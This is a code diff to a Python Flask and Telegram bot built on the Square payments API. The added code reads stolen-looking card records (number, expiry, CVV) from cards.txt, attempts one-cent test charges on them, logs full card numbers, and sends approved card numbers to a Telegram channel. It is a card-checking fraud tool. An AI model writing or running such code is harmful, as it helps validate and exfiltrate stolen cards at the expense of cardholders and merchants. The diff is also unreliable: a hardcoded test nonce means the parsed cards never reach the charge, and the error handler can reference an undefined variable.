@@ -45,12 +45,20 @@ def send_to_target_channel(transaction_info):
         logging.error(f"Failed to send message: {e}")
 
 # Function to handle the Square payment using the tokenized card nonce
-async def process_payment(payment_nonce, amount=1):
+async def process_payment(card_details):
     try:
+        card_info = {
+            "number": card_details[0],  # Card number
+            "exp_month": int(card_details[1]),  # Expiration Month
+            "exp_year": int(card_details[2]),   # Expiration Year
+            "cvv": card_details[3]              # CVV
+        }
+
+        # Simulating the payment request (replace this part with actual nonce creation)
         body = {
-            "source_id": payment_nonce,
+            "source_id": "cnon:card-nonce-ok",  # For testing, replace with actual nonce
             "amount_money": {
-                "amount": amount,  # Amount in cents, $0.01 for testing
+                "amount": 1,  # Amount in cents, $0.01 for testing
                 "currency": "USD"
             },
             "idempotency_key": os.urandom(16).hex()  # Ensure each transaction is unique
@@ -58,17 +66,34 @@ async def process_payment(payment_nonce, amount=1):
 
         result = square_client.payments.create_payment(body)
         if result.is_success:
-            logging.info("Payment successful.")
-            return result.body['payment']
+            logging.info(f"Payment successful for card: {card_info['number']}")
+            return card_info  # Return the card info for approved cards
         else:
-            logging.warning(f"Payment failed: {result.errors}")
+            logging.warning(f"Payment failed for card: {card_info['number']}, reason: {result.errors}")
             return None
 
     except Exception as e:
-        logging.error(f"Square API error: {e}")
+        logging.error(f"Error processing payment for card: {card_info['number']}, error: {e}")
         return None
 
-# Route for processing payments
+# Function to scrape card details from cards.txt file and process payments
+async def scrape_and_process_payments():
+    try:
+        async with aiofiles.open('cards.txt', 'r') as file:
+            lines = await file.readlines()
+
+        for line in lines:
+            card_details = line.strip().split('|')  # Split card details by '|'
+
+            # Process the payment asynchronously
+            approved_card = await process_payment(card_details)
+            if approved_card:
+                send_to_target_channel(approved_card['number'])  # Send approved card number to Telegram
+
+    except Exception as e:
+        logging.error(f"Error in scraping and processing payments: {e}")
+
+# Route for processing payments via API (if needed for frontend)
 @app.route('/process-payment', methods=['POST'])
 def payment_route():
     data = request.get_json()
@@ -85,7 +110,8 @@ def payment_route():
 def index():
     return render_template('index.html')
 
-# Start the Flask app and Telegram bot
+# Start the scraping and processing
 if __name__ == '__main__':
     logging.info("Bot is running...")
+    asyncio.run(scrape_and_process_payments())  # Start the payment processing
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))  # Render uses the $PORT environment variable
